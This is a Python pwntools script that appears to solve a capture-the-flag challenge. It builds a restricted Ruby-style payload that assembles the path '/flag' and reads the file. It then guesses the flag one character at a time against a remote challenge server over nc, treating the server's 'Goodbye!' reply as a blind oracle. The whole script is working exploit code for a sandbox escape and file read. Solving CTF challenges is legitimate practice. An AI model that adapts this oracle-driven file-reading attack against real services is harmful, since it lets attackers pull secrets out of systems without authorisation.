from pwn import *

FLAG = "TFCC"

while "}" not in FLAG:
    for new_char in "}_abcdefghijklmnoqrstuvwxyz!@#$^&()+;-=':\"[],.<>/?":
        FLAG += new_char
        print("Current",FLAG)
        setup = (
            "A=?/\n"
            "G=?f\n"
            "H=?l\n"
            "I=?a\n"
            "J=?g\n"

            "A+=G\n"
            "A+=H\n"
            "A+=I\n"
            "A+=J\n"

            "C=$*\n"
            "C<<A\n"
            "A+=J\n"
            "C<<A\n"
        )

        delimiter = "K=?F\n"

        for c in FLAG[2:]:
            delimiter += (
                f"L=?{c}\n"
                "K+=L\n"
            )

        checker = (
            "$/=K\n"
            f"2{FLAG[1:]}gets{FLAG[1:]}gets{FLAG[1:]}\n"
            )

        payload = setup + delimiter + checker

        open("payload", "w").write(payload)

        p = process(["bash", "-c", "nc challs.tfcctf.com 30137 < payload"], level="error")
        # p = process(["bash", "-c", "ruby main.rb < payload"], level="error")
        data = p.recvall(timeout=2)
        p.close()

        if not b"Goodbye!" in data:
            print("\nFOUND")
            break
        else:
            FLAG = FLAG[:-1]
